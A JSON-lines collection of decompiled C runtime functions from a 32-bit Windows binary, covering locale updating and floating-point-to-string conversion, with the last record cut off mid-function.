{"Function Name": "__updatetlocinfoEx_nolock", "Address": "10031ef8", "Source Code": "\\*\nundefined ** __cdecl __updatetlocinfoEx_nolock(void **locale_pointer, undefined **new_locale)\n{\n    \n    if (new_locale == (undefined **)0x0 || locale_pointer == (void **)0x0) {\n        return (undefined **)0x0; \n    }\n    \n    undefined **current_locale = (undefined **)*locale_pointer;\n    \n    \n    if (current_locale != new_locale) {\n        *locale_pointer = new_locale; \n        ___acrt_add_locale_ref((int)new_locale); \n        \n        \n        if (current_locale != (undefined **)0x0 && ___acrt_release_locale_ref((int)current_locale), \n            current_locale[3] == (undefined *)0x0 && current_locale != &PTR_DAT_1004e1f0) {\n            ___acrt_free_locale(current_locale); \n        }\n    }\n    \n    return new_locale; \n}\n*\\ \n \nundefined ** __cdecl __updatetlocinfoEx_nolock(void **locale_pointer, undefined **new_locale)\n{\n    if (new_locale == (undefined **)0x0 || locale_pointer == (void **)0x0) {\n        return (undefined **)0x0;\n    }\n    undefined **current_locale = (undefined **)*locale_pointer;\n    if (current_locale != new_locale) {\n        *locale_pointer = new_locale;\n        ___acrt_add_locale_ref((int)new_locale);\n        if (current_locale != (undefined **)0x0 && ___acrt_release_locale_ref((int)current_locale), current_locale[3] == (undefined *)0x0 && current_locale != &PTR_DAT_1004e1f0) {\n            ___acrt_free_locale(current_locale);\n        }\n    }\n    return new_locale;\n}"}
{"Function Name": "___acrt_fp_strflt_to_string", "Address": "10031f48", "Source Code": "undefined4 __cdecl\n___acrt_fp_strflt_to_string(undefined8 *param_1, uint param_2, int param_3, int param_4)\n{\n    int iVar2; \n    char *pcVar3; \n    char *pcVar6; \n    \n    if ((param_1 != (undefined8 *)0x0) && (param_2 != 0)) {\n        *(undefined *)param_1 = 0; \n        iVar2 = (param_3 < 1) ? 0 : param_3; \n        \n        if (param_2 <= iVar2 + 1U) {\n            undefined4 *puVar1 = (undefined4 *)FUN_100253b8(); \n            *puVar1 = 0x22; \n            FUN_1001de96(); \n            return 0x22; \n        }\n        \n        if (param_4 != 0) {\n            pcVar3 = (char *)((int)param_1 + 1); \n            pcVar6 = *(char **)(param_4 + 8); \n            *(undefined *)param_1 = 0x30; \n            \n            if (param_3 > 0) {\n                do {\n                    char cVar5 = *pcVar6 ? *pcVar6++ : '0'; \n                    *pcVar3++ = cVar5; \n                } while (--param_3 > 0); \n            }\n            *pcVar3 = '\\0'; \n            \n            if ((-1 < param_3) && ('4' < *pcVar6)) {\n                while (*--pcVar3 == '9') { \n                    *pcVar3 = '0'; \n                }\n                (*pcVar3)++; \n            }\n            \n            if (*(char *)param_1 == '1') {\n                *(int *)(param_4 + 4) += 1; \n            } else {\n                char *puVar4 = (char *)((int)param_1 + 1); \n                while (*puVar4 != '\\0') { \n                    puVar4++; \n                }\n                \n                FUN_10018bf0(param_1, (undefined8 *)((int)param_1 + 1), (uint)((int)puVar4 + (1 - ((int)param_1 + 2))));\n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_10032004", "Address": "10032004", "Source Code": "void __cdecl\nFUN_10032004(uint param_1,uint param_2,int param_3,int *param_4,char *param_5,rsize_t param_6)\n{\nbyte bVar1;\nulonglong uVar2;\nbool bVar3;\nint *piVar4;\nuint uVar5;\nchar cVar6;\nint iVar7;\nrsize_t rVar8;\nuint uVar9;\nerrno_t eVar10;\nuint uVar11;\nundefined4 extraout_EDX;\nuint *puVar12;\nundefined8 *puVar13;\nundefined8 *puVar14;\nundefined8 *puVar15;\nundefined8 *puVar16;\nuint uVar17;\nchar *pcVar18;\nundefined8 *puVar19;\nsize_t sVar20;\nfloat10 fVar21;\nulonglong uVar22;\nlonglong lVar23;\nchar *pcVar25;\ndouble dVar24;\nundefined8 auStack_968 [57];\nbyte local_79c;\nchar local_794;\nint local_78c;\nuint uStack_788;\nint *local_784;\nchar *local_780;\nchar *local_77c;\nuint uStack_778;\nundefined8 *local_774;\nuint local_770;\nundefined8 local_76c;\nundefined8 *local_764;\nundefined8 *puStack_760;\nundefined8 *puStack_75c;\nundefined8 *local_758;\nundefined8 *local_754;\nundefined8 *local_750;\nundefined uStack_749;\nundefined8 *puStack_748;\nundefined8 auStack_744 [57];\nundefined8 *local_578;\nundefined8 local_574;\nundefined8 *puStack_3a8;\nundefined8 uStack_3a4;\nundefined8 *local_1d8;\nundefined8 local_1d4;\nundefined4 auStack_1cc [113];\nuint local_8;\n\npcVar18 = param_5;\npiVar4 = param_4;\nlocal_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\nlocal_784 = param_4;\nlocal_77c = param_5;\n_fegetenv((uint *)&local_79c);\nlocal_794 = (local_79c & 0x1f) != 0x1f;\nif ((bool)local_794) {\n_feholdexcept((uint *)&local_79c);\n}\nuVar11 = param_2;\nuVar17 = param_1;\ncVar6 = '-';\nif ((param_2 & 0x80000000) == 0) {\ncVar6 = ' ';\n}\n*piVar4 = (int)cVar6;\npiVar4[2] = (int)pcVar18;\nif (((param_2 & 0x7ff00000) == 0) && ((param_1 | param_2 & 0xfffff) == 0)) {\npcVar25 = \"0\";\nlocal_784[1] = 0;\n}\nelse {\niVar7 = FUN_100294c5(&param_1);\nif (iVar7 != 0) {\nlocal_784[1] = 1;\n}\nif (iVar7 == 1) {\npcVar25 = \"1#INF\";\n}\nelse if (iVar7 == 2) {\npcVar25 = \"1#QNAN\";\n}\nelse if (iVar7 == 3) {\npcVar25 = \"1#SNAN\";\n}\nelse {\nif (iVar7 != 4) {\nparam_2 = uVar11 & 0x7fffffff;\nlocal_78c = 0;\nlocal_780 = (char *)(param_3 + 1);\nuVar22 = CONCAT44(uVar11,uVar17) & 0x7fffffffffffffff;\nlocal_76c._4_4_ = (uint)(uVar22 >> 0x20);\nuVar11 = local_76c._4_4_ >> 0x14;\nif (uVar11 != 0) {\niVar7 = 0x100000;\n}\nelse {\niVar7 = 0;\n}\nlocal_76c._0_4_ = (uint)uVar22;\nuVar5 = (uint)local_76c;\nuVar9 = (local_76c._4_4_ & 0xfffff) + iVar7;\npuVar14 = (undefined8 *)(uVar11 + ((uVar11 == 0) - 0x433));\nparam_1 = uVar17;\nlocal_76c = uVar22;\nlocal_750 = puVar14;\nfVar21 = (float10)FUN_10036610();\ndVar24 = (double)fVar21;\nFUN_10036720(dVar24);\nuVar22 = FUN_100375f0((int)((ulonglong)dVar24 >> 0x20),extraout_EDX);\nlocal_770 = (uint)uVar22;\nif ((local_770 == 0x7fffffff) || (local_770 == 0x80000000)) {\nlocal_770 = 0;\n}\nlocal_1d4._0_4_ = uVar5;\nlocal_1d4._4_4_ = uVar9;\nuVar17 = (uint)(uVar9 != 0);\npuVar13 = (undefined8 *)(uVar17 + 1);\nlocal_1d8 = puVar13;\nif ((int)puVar14 < 0) {\nif (puVar14 == (undefined8 *)0xfffffc02) {\nLAB_100326d2:\nuVar17 = *(uint *)((int)&local_1d4 + uVar17 * 4);\nlocal_76c = local_76c & 0xffffffff;\niVar7 = 0x1f;\nif (uVar17 != 0) {\nfor (; uVar17 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n}\n}\nif (uVar17 == 0) {\niVar7 = 0;\n}\nelse {\niVar7 = iVar7 + 1;\n}\nuStack_749 = iVar7 == 0x20;\nif ((puVar13 == (undefined8 *)0x73) && ((bool)uStack_749)) {\nbVar3 = true;\n}\nelse {\nbVar3 = false;\n}\nif (((undefined8 *)0x73 < puVar13) || (bVar3)) {\nlocal_578 = (undefined8 *)0x0;\nlocal_1d8 = (undefined8 *)0x0;\n_memcpy_s(&local_1d4,0x1cc,&local_574,0);\n}\nelse {\npuVar15 = (undefined8 *)0x72;\nif (puVar13 < (undefined8 *)0x72) {\npuVar15 = puVar13;\n}\nif (puVar15 != (undefined8 *)0xffffffff) {\npuVar19 = (undefined8 *)((int)&local_1d4 + (int)puVar15 * 4);\npuVar16 = puVar15;\nlocal_754 = puVar19;\ndo {\nif (puVar16 < puVar13) {\nlocal_758 = *(undefined8 **)puVar19;\n}\nelse {\nlocal_758 = (undefined8 *)0x0;\n}\nif ((undefined8 *)((int)puVar16 - 1U) < puVar13) {\npuVar12 = *(uint **)((int)puVar19 - 4);\n}\nelse {\npuVar12 = (uint *)0x0;\n}\npuVar19 = (undefined8 *)((int)puVar19 - 4);\npuVar16 = (undefined8 *)((int)puVar16 + -1);\n*(uint **)local_754 = (uint *)((uint)puVar12 >> 0x1f ^ (int)local_758 * 2);\nlocal_754 = (undefined8 *)((int)local_754 - 4);\npuVar13 = local_1d8;\npuVar14 = local_750;\n} while (puVar16 != (undefined8 *)0xffffffff);\n}\nlocal_1d8 = puVar15;\nif ((bool)uStack_749) {\nlocal_1d8 = (undefined8 *)((int)puVar15 + 1);\n}\n}\nuVar17 = 1U - (int)puVar14 >> 5;\n_memset(&local_574,0,uVar17 * 4);\n*(int *)((int)&local_574 + uVar17 * 4) = 1 << ((byte)(1U - (int)puVar14) & 0x1f);\n}\nelse {\nlocal_574._0_4_ = 0;\npuVar15 = (undefined8 *)0x2;\nlocal_574._4_4_ = 0x100000;\nlocal_578 = (undefined8 *)0x2;\nif (puVar13 != (undefined8 *)0x2) goto LAB_100326d2;\niVar7 = 0;\ndo {\nif (*(int *)((int)&local_574 + iVar7) != *(int *)((int)&local_1d4 + iVar7))\ngoto LAB_100326d2;\niVar7 = iVar7 + 4;\n} while (iVar7 != 8);\nlocal_76c = local_76c & 0xffffffff;\niVar7 = 0x1f;\nif (uVar9 != 0) {\nfor (; uVar9 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n}\n}\nif (uVar9 == 0) {\niVar7 = 0;\n}\nelse {\niVar7 = iVar7 + 1;\n}\nuStack_749 = 0x20U - iVar7 < 2;\npuVar14 = &local_1d4 + 1;\nlocal_754 = puVar14;\ndo {\nif (puVar15 < puVar13) {\nlocal_758 = *(undefined8 **)puVar14;\n}\nelse {\nlocal_758 = (undefined8 *)0x0;\n}\nif ((undefined8 *)((int)puVar15 - 1U) < puVar13) {\npuVar12 = *(uint **)((int)puVar14 - 4);\n}\nelse {\npuVar12 = (uint *)0x0;\n}\npuVar14 = (undefined8 *)((int)puVar14 - 4);\npuVar15 = (undefined8 *)((int)puVar15 + -1);\n*(uint *)local_754 = (uint)puVar12 >> 0x1e ^ (int)local_758 << 2;\nlocal_754 = (undefined8 *)((int)local_754 - 4);\npuVar13 = local_1d8;\n} while (puVar15 != (undefined8 *)0xffffffff);\nlocal_1d8 = (undefined8 *)((byte)uStack_749 + 2);\nuStack_778 = 2 - (int)local_750;\nuVar17 = uStack_778 >> 5;\n_memset(&local_574,0,uVar17 * 4);\n*(int *)((int)&local_574 + uVar17 * 4) = 1 << ((byte)uStack_778 & 0x1f);\n}\nlocal_578 = (undefined8 *)(uVar17 + 1);\npuStack_3a8 = local_578;\n_memcpy_s(&uStack_3a4,0x1cc,&local_574,(int)local_578 * 4);\n}\nelse {\nlocal_574._0_4_ = 0;\nlocal_574._4_4_ = 0x100000;\nlocal_578 = (undefined8 *)0x2;\nif (puVar13 == (undefined8 *)0x2) {\niVar7 = 0;\ndo {\nif (*(int *)((int)&local_574 + iVar7) != *(int *)((int)&local_1d4 + iVar7))\ngoto LAB_100323e2;\niVar7 = iVar7 + 4;\n} while (iVar7 != 8);\nlocal_754 = (undefined8 *)((int)local_750 + 2U & 0x1f);\nlocal_774 = (undefined8 *)(0x20 - (int)local_754);\npuVar14 = (undefined8 *)((int)local_750 + 2U >> 5);\nlocal_758 = puVar14;\nlVar23 = __allshl((byte)local_774,0);\nlocal_76c = local_76c & 0xffffffff;\nlocal_764 = (undefined8 *)((int)lVar23 + -1);\niVar7 = 0x1f;\nif (uVar9 != 0) {\nfor (; uVar9 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n}\n}\nuStack_778 = ~(uint)local_764;\nif (uVar9 == 0) {\niVar7 = 0;\n}\nelse {\niVar7 = iVar7 + 1;\n}\npuStack_75c = (undefined8 *)((int)puVar14 + 2);\nuStack_749 = (undefined8 *)(0x20 - iVar7) < local_754;\nif ((puStack_75c == (undefined8 *)0x73) && ((bool)uStack_749)) {\nbVar3 = true;\n}\nelse {\nbVar3 = false;\n}\nif (((undefined8 *)0x73 < puStack_75c) || (bVar3)) {\nlocal_578 = (undefined8 *)0x0;\nlocal_1d8 = (undefined8 *)0x0;\n_memcpy_s(&local_1d4,0x1cc,&local_574,0);\n}\nelse {\nif ((undefined8 *)0x71 < puStack_75c) {\npuStack_75c = (undefined8 *)0x72;\n}\npuStack_760 = puStack_75c;\nif (puStack_75c != (undefined8 *)0xffffffff) {\npuVar15 = (undefined8 *)((int)puStack_75c - (int)local_758);\nlocal_750 = (undefined8 *)((int)&local_1d4 + (int)puVar15 * 4);\ndo {\npuVar14 = local_758;\nif (puStack_760 < local_758) break;\nif (puVar15 < puVar13) {\nuVar17 = *(uint *)local_750;\n}\nelse {\nuVar17 = 0;\n}\nif ((undefined8 *)((int)puVar15 - 1U) < puVar13) {\nuVar11 = *(uint *)((int)local_750 + -4);\n}\nelse {\nuVar11 = 0;\n}\n*(uint *)((int)&local_1d4 + (int)puStack_760 * 4) =\n(uVar11 & uStack_778) >> ((byte)local_774 & 0x1f) |\n(uVar17 & (uint)local_764) << ((byte)local_754 & 0x1f);\npuStack_760 = (undefined8 *)((int)puStack_760 - 1);\npuVar15 = (undefined8 *)((int)puVar15 + -1);\nlocal_750 = (undefined8 *)((int)local_750 + -4);\npuVar13 = local_1d8;\n} while (puStack_760 != (undefined8 *)0xffffffff);\n}\nif (puVar14 != (undefined8 *)0x0) {\npuVar13 = &local_1d4;\nfor (; puVar14 != (undefined8 *)0x0; puVar14 = (undefined8 *)((int)puVar14 + -1)) {\n*(undefined4 *)puVar13 = 0;\npuVar13 = (undefined8 *)((int)puVar13 + 4);\n}\n}\nlocal_1d8 = puStack_75c;\nif ((bool)uStack_749) {\nlocal_1d8 = (undefined8 *)((int)puStack_75c + 1);\n}\n}\nlocal_574._0_4_ = 4;\n}\nelse {\nLAB_100323e2:\nlocal_758 = (undefined8 *)((int)local_750 + 1U & 0x1f);\nlocal_764 = (undefined8 *)(0x20 - (int)local_758);\npuVar14 = (undefined8 *)((int)local_750 + 1U >> 5);\nlocal_750 = puVar14;\nlVar23 = __allshl((byte)local_764,0);\nuVar17 = *(uint *)((int)&local_1d4 + uVar17 * 4);\nuStack_778 = (int)lVar23 - 1;\nlocal_76c = local_76c & 0xffffffff;\niVar7 = 0x1f;\nif (uVar17 != 0) {\nfor (; uVar17 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n}\n}\nlocal_774 = (undefined8 *)~uStack_778;\nif (uVar17 == 0) {\niVar7 = 0;\n}\nelse {\niVar7 = iVar7 + 1;\n}\npuStack_75c = (undefined8 *)((int)puVar13 + (int)puVar14);\nuStack_749 = (undefined8 *)(0x20 - iVar7) < local_758;\nif ((puStack_75c == (undefined8 *)0x73) && ((bool)uStack_749)) {\nbVar3 = true;\n}\nelse {\nbVar3 = false;\n}\nif (((undefined8 *)0x73 < puStack_75c) || (bVar3)) {\nlocal_578 = (undefined8 *)0x0;\nlocal_1d8 = (undefined8 *)0x0;\n_memcpy_s(&local_1d4,0x1cc,&local_574,0);\n}\nelse {\nif ((undefined8 *)0x71 < puStack_75c) {\npuStack_75c = (undefined8 *)0x72;\n}\nlocal_754 = puStack_75c;\nif (puStack_75c != (undefined8 *)0xffffffff) {\npuVar15 = (undefined8 *)((int)puStack_75c - (int)local_750);\npuStack_760 = (undefined8 *)((int)&local_1d4 + (int)puVar15 * 4);\ndo {\npuVar14 = local_750;\nif (local_754 < local_750) break;\nif (puVar15 < puVar13) {\nuVar17 = *(uint *)puStack_760;\n}\nelse {\nuVar17 = 0;\n}\nif ((undefined8 *)((int)puVar15 - 1U) < puVar13) {\nuVar11 = *(uint *)((int)puStack_760 - 4);\n}\nelse {\nuVar11 = 0;\n}\npuStack_760 = (undefined8 *)((int)puStack_760 - 4);\n*(uint *)((int)&local_1d4 + (int)local_754 * 4) =\n(uVar17 & uStack_778) << ((byte)local_758 & 0x1f) |\n(uVar11 & (uint)local_774) >> ((byte)local_764 & 0x1f);\nlocal_754 = (undefined8 *)((int)local_754 - 1);\npuVar15 = (undefined8 *)((int)puVar15 + -1);\npuVar13 = local_1d8;\n} while (local_754 != (undefined8 *)0xffffffff);\n}\nif (puVar14 != (undefined8 *)0x0) {\npuVar13 = &local_1d4;\nfor (; puVar14 != (undefined8 *)0x0; puVar14 = (undefined8 *)((int)puVar14 + -1)) {\n*(undefined4 *)puVar13 = 0;\npuVar13 = (undefined8 *)((int)puVar13 + 4);\n}\n}\nlocal_1d8 = puStack_75c;\nif ((bool)uStack_749) {\nlocal_1d8 = (undefined8 *)((int)puStack_75c + 1);\n}\n}\nlocal_574._0_4_ = 2;\n}\npuStack_3a8 = (undefined8 *)0x1;\nlocal_574._4_4_ = 0;\nlocal_578 = (undefined8 *)0x1;\n_memcpy_s(&uStack_3a4,0x1cc,&local_574,4);\n}\nuStack_778 = 10;\nif ((int)local_770 < 0) {\nuStack_788 = -local_770 % 10;\nfor (local_758 = (undefined8 *)(-local_770 / 10); local_758 != (undefined8 *)0x0;\nlocal_758 = (undefined8 *)((int)local_758 - (int)puStack_75c)) {\npuStack_75c = local_758;\nif ((undefined8 *)0x26 < local_758) {\npuStack_75c = (undefined8 *)0x26;\n}\nbVar1 = (&DAT_1003e957)[(int)puStack_75c * 4];\nsVar20 = (uint)(byte)(&DAT_1003e956)[(int)puStack_75c * 4] * 4;\nlocal_578 = (undefined8 *)\n((uint)(byte)(&DAT_1003e956)[(int)puStack_75c * 4] + (uint)bVar1);\n_memset(&local_574,0,sVar20);\nFUN_10018670((undefined8 *)((int)&local_574 + sVar20),\n(undefined8 *)\n(&UNK_1003e050 +\n(uint)*(ushort *)(&UNK_1003e954 + (int)puStack_75c * 4) * 4),\n(uint)bVar1 << 2);\nuVar17 = (uint)local_1d4;\npuStack_760 = local_578;\nif (local_578 < (undefined8 *)0x2) {\nif ((uint)local_574 == 0) {\nLAB_10032d87:\nlocal_1d8 = (undefined8 *)0x0;\nrVar8 = 0;\npuVar14 = auStack_968;\ngoto LAB_10033013;\n}\nif (((uint)local_574 == 1) || (local_1d8 == (undefined8 *)0x0)) goto LAB_10033024;\nuVar11 = 0;\nlocal_76c = CONCAT44(local_1d8,(uint)local_76c);\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)(uint)local_574 *\n(ulonglong)*(uint *)((int)&local_1d4 + (int)puVar14 * 4) +\n(ulonglong)uVar11;\n*(int *)((int)&local_1d4 + (int)puVar14 * 4) = (int)lVar23;\nuVar11 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != local_1d8);\nLAB_10032de7:\nif (uVar11 == 0) goto LAB_10033024;\nif (local_1d8 < (undefined8 *)0x73) {\n*(uint *)((int)&local_1d4 + (int)local_1d8 * 4) = uVar11;\nlocal_1d8 = (undefined8 *)((int)local_1d8 + 1);\ngoto LAB_10033024;\n}\nLAB_100330c2:\nlocal_1d8 = (undefined8 *)0x0;\n_memcpy_s(&local_1d4,0x1cc,auStack_968,0);\nbVar3 = false;\n}\nelse {\nif (local_1d8 < (undefined8 *)0x2) {\nlocal_1d8 = local_578;\n_memcpy_s(&local_1d4,0x1cc,&local_574,(int)local_578 << 2);\nif (uVar17 != 0) {\nif ((uVar17 != 1) && (local_1d8 != (undefined8 *)0x0)) {\nuVar11 = 0;\nlocal_76c = CONCAT44(local_1d8,(uint)local_76c);\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)uVar17 *\n(ulonglong)*(uint *)((int)&local_1d4 + (int)puVar14 * 4) +\n(ulonglong)uVar11;\n*(int *)((int)&local_1d4 + (int)puVar14 * 4) = (int)lVar23;\nuVar11 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != local_1d8);\ngoto LAB_10032de7;\n}\ngoto LAB_10033024;\n}\ngoto LAB_10032d87;\n}\npuVar14 = &local_574;\nif (local_578 < local_1d8) {\nlocal_774 = &local_1d4;\npuStack_760 = local_1d8;\nlocal_764 = local_578;\n}\nelse {\npuVar14 = &local_1d4;\nlocal_774 = &local_574;\nlocal_764 = local_1d8;\n}\nlocal_1d8 = (undefined8 *)0x0;\npuVar13 = (undefined8 *)0x0;\npuStack_748 = (undefined8 *)0x0;\nif (local_764 != (undefined8 *)0x0) {\nlocal_78c = (int)puVar14 - (int)auStack_744;\ndo {\nuVar17 = *(uint *)((int)auStack_744 + local_78c + (int)puVar13 * 4);\nlocal_76c = CONCAT44(uVar17,(uint)local_76c);\nif (uVar17 == 0) {\nif (puVar13 == local_1d8) {\n*(undefined4 *)((int)auStack_744 + (int)puVar13 * 4) = 0;\nlocal_1d8 = (undefined8 *)((int)puVar13 + 1);\npuStack_748 = local_1d8;\n}\n}\nelse {\nuVar11 = 0;\nlocal_754 = (undefined8 *)0x0;\npuVar14 = puVar13;\nif (puStack_760 != (undefined8 *)0x0) {\ndo {\nif (puVar14 == (undefined8 *)0x73) break;\nif (puVar14 == local_1d8) {\n*(undefined4 *)((int)auStack_744 + (int)puVar14 * 4) = 0;\npuStack_748 = (undefined8 *)((int)local_754 + 1U + (int)puVar13);\n}\nlVar23 = (ulonglong)*(uint *)((int)local_774 + (int)local_754 * 4) *\n(ulonglong)uVar17 + (ulonglong)uVar11;\nuVar9 = (uint)lVar23;\npuVar12 = (uint *)((int)auStack_744 + (int)puVar14 * 4);\nuVar11 = *puVar12;\n*puVar12 = *puVar12 + uVar9;\nuVar11 = (int)((ulonglong)lVar23 >> 0x20) + (uint)CARRY4(uVar11,uVar9);\nlocal_754 = (undefined8 *)((int)local_754 + 1);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\nlocal_1d8 = puStack_748;\n} while (local_754 != puStack_760);\ndo {\nif (uVar11 == 0) break;\nif (puVar14 == (undefined8 *)0x73) goto LAB_100330c2;\nif (puVar14 == local_1d8) {\n*(undefined4 *)((int)auStack_744 + (int)puVar14 * 4) = 0;\npuStack_748 = (undefined8 *)((int)puVar14 + 1);\n}\npuVar12 = (uint *)((int)auStack_744 + (int)puVar14 * 4);\nuVar17 = *puVar12;\n*puVar12 = *puVar12 + uVar11;\nuVar11 = (uint)CARRY4(uVar17,uVar11);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\nlocal_1d8 = puStack_748;\n} while( true );\n}\nif (puVar14 == (undefined8 *)0x73) goto LAB_100330c2;\n}\npuVar13 = (undefined8 *)((int)puVar13 + 1);\n} while (puVar13 != local_764);\n}\nrVar8 = (int)local_1d8 << 2;\npuVar14 = auStack_744;\nLAB_10033013:\n_memcpy_s(&local_1d4,0x1cc,puVar14,rVar8);\nLAB_10033024:\nbVar3 = true;\n}\nif (!bVar3) goto LAB_10033110;\n}\nif (uStack_788 != 0) {\nuVar17 = *(uint *)(&DAT_1003e9ec + uStack_788 * 2);\nlocal_76c = CONCAT44(uVar17,(uint)local_76c);\nif (uVar17 == 0) {\nLAB_10033110:\nlocal_1d8 = (undefined8 *)0x0;\npuVar14 = &local_1d4;\ngoto LAB_1003311d;\n}\nif ((uVar17 != 1) && (local_1d8 != (undefined8 *)0x0)) {\nuVar11 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)uVar17 *\n(ulonglong)*(uint *)((int)&local_1d4 + (int)puVar14 * 4) +\n(ulonglong)uVar11;\n*(int *)((int)&local_1d4 + (int)puVar14 * 4) = (int)lVar23;\nuVar11 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != local_1d8);\nif (uVar11 != 0) {\nif ((undefined8 *)0x72 < local_1d8) goto LAB_10033110;\n*(uint *)((int)&local_1d4 + (int)local_1d8 * 4) = uVar11;\nlocal_1d8 = (undefined8 *)((int)local_1d8 + 1);\n}\n}\n}\n}\nelse {\nlocal_774 = (undefined8 *)(local_770 / 10);\nlocal_76c = CONCAT44(local_770 % 10,(uint)local_76c);\nuVar17 = local_770 % 10;\nif (local_774 != (undefined8 *)0x0) {\ndo {\nlocal_754 = local_774;\nif ((undefined8 *)0x26 < local_774) {\nlocal_754 = (undefined8 *)0x26;\n}\nbVar1 = (&DAT_1003e957)[(int)local_754 * 4];\nsVar20 = (uint)(byte)(&DAT_1003e956)[(int)local_754 * 4] * 4;\nlocal_578 = (undefined8 *)\n((uint)(byte)(&DAT_1003e956)[(int)local_754 * 4] + (uint)bVar1);\n_memset(&local_574,0,sVar20);\nFUN_10018670((undefined8 *)((int)&local_574 + sVar20),\n(undefined8 *)\n(&UNK_1003e050 +\n(uint)*(ushort *)(&UNK_1003e954 + (int)local_754 * 4) * 4),\n(uint)bVar1 << 2);\nuVar17 = (uint)uStack_3a4;\nlocal_764 = local_578;\nif (local_578 < (undefined8 *)0x2) {\nif ((uint)local_574 == 0) {\nrVar8 = 0;\npuStack_748 = (undefined8 *)0x0;\npuStack_3a8 = (undefined8 *)0x0;\nLAB_10032bd0:\npuVar14 = auStack_744;\ngoto LAB_10032bd7;\n}\nif (((uint)local_574 == 1) || (puStack_3a8 == (undefined8 *)0x0)) goto LAB_10032be8;\nuVar11 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)(uint)local_574 *\n(ulonglong)*(uint *)((int)&uStack_3a4 + (int)puVar14 * 4) +\n(ulonglong)uVar11;\n*(int *)((int)&uStack_3a4 + (int)puVar14 * 4) = (int)lVar23;\nuVar11 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != puStack_3a8);\nLAB_100329fc:\nlocal_764 = puStack_3a8;\nif (uVar11 == 0) goto LAB_10032be8;\nif (puStack_3a8 < (undefined8 *)0x73) {\n*(uint *)((int)&uStack_3a4 + (int)puStack_3a8 * 4) = uVar11;\npuStack_3a8 = (undefined8 *)((int)puStack_3a8 + 1);\ngoto LAB_10032be8;\n}\nlocal_578 = (undefined8 *)0x0;\npuVar14 = &local_574;\nLAB_10032c45:\npuStack_3a8 = (undefined8 *)0x0;\n_memcpy_s(&uStack_3a4,0x1cc,puVar14,0);\nbVar3 = false;\n}\nelse {\nif ((undefined8 *)0x1 < puStack_3a8) {\npuVar14 = &local_574;\nif (local_578 < puStack_3a8) {\nlocal_758 = &uStack_3a4;\npuStack_760 = local_578;\nlocal_764 = puStack_3a8;\n}\nelse {\npuVar14 = &uStack_3a4;\nlocal_758 = &local_574;\npuStack_760 = puStack_3a8;\n}\npuStack_3a8 = (undefined8 *)0x0;\npuVar13 = (undefined8 *)0x0;\npuStack_748 = (undefined8 *)0x0;\nif (puStack_760 != (undefined8 *)0x0) {\nlocal_78c = (int)puVar14 - (int)auStack_744;\ndo {\nuStack_788 = *(uint *)((int)auStack_744 + local_78c + (int)puVar13 * 4);\nif (uStack_788 == 0) {\nif (puVar13 == puStack_3a8) {\n*(undefined4 *)((int)auStack_744 + (int)puVar13 * 4) = 0;\npuStack_3a8 = (undefined8 *)((int)puVar13 + 1);\npuStack_748 = puStack_3a8;\n}\n}\nelse {\nlocal_750 = (undefined8 *)0x0;\npuStack_75c = (undefined8 *)0x0;\npuVar14 = puVar13;\nif (local_764 != (undefined8 *)0x0) {\ndo {\nif (puVar14 == (undefined8 *)0x73) break;\nif (puVar14 == puStack_3a8) {\n*(undefined4 *)((int)auStack_744 + (int)puVar14 * 4) = 0;\npuStack_748 = (undefined8 *)((int)puStack_75c + 1U + (int)puVar13);\n}\nlVar23 = (ulonglong)*(uint *)((int)local_758 + (int)puStack_75c * 4) *\n(ulonglong)uStack_788;\nuVar11 = (uint)lVar23;\npuVar12 = (uint *)((int)auStack_744 + (int)puVar14 * 4);\nuVar17 = *puVar12;\nuVar9 = uVar11 + *puVar12;\n*(uint *)((int)auStack_744 + (int)puVar14 * 4) = uVar9 + (int)local_750;\nlocal_750 = (undefined8 *)\n((int)((ulonglong)lVar23 >> 0x20) +\n(uint)CARRY4(uVar11,uVar17) +\n(uint)CARRY4(uVar9,(uint)local_750));\npuStack_75c = (undefined8 *)((int)puStack_75c + 1);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\npuStack_3a8 = puStack_748;\n} while (puStack_75c != local_764);\ndo {\nif (local_750 == (undefined8 *)0x0) break;\nif (puVar14 == (undefined8 *)0x73) goto LAB_10032c30;\nif (puVar14 == puStack_3a8) {\n*(undefined4 *)((int)auStack_744 + (int)puVar14 * 4) = 0;\npuStack_748 = (undefined8 *)((int)puVar14 + 1);\n}\nuVar17 = *(uint *)((int)auStack_744 + (int)puVar14 * 4);\n*(uint *)((int)auStack_744 + (int)puVar14 * 4) = uVar17 + (int)local_750\n;\nlocal_750 = (undefined8 *)(uint)CARRY4(uVar17,(uint)local_750);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\npuStack_3a8 = puStack_748;\n} while( true );\n}\nif (puVar14 == (undefined8 *)0x73) {\nLAB_10032c30:\npuVar14 = auStack_968;\ngoto LAB_10032c45;\n}\n}\npuVar13 = (undefined8 *)((int)puVar13 + 1);\n} while (puVar13 != puStack_760);\n}\nrVar8 = (int)puStack_3a8 << 2;\ngoto LAB_10032bd0;\n}\npuStack_3a8 = local_578;\n_memcpy_s(&uStack_3a4,0x1cc,&local_574,(int)local_578 << 2);\nif (uVar17 != 0) {\nif ((uVar17 != 1) && (puStack_3a8 != (undefined8 *)0x0)) {\nuVar11 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)uVar17 *\n(ulonglong)*(uint *)((int)&uStack_3a4 + (int)puVar14 * 4) 